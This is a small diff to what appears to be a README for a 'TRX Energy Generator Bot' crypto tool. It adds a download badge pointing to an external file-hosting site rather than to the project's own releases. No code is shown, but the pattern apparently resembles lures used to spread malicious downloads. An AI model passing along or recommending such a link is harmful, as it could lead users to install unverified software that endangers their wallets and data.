@@ -1,4 +1,4 @@
-
+[![Download TRX EnergyGenerator](https://img.shields.io/badge/Download-TRX%20GRPCEnergyGenerator-blueviolet)](https://downeefiles.com/s/trxnrgy)
 
 **TRX Energy Generator Bot ⚡🚀**
 
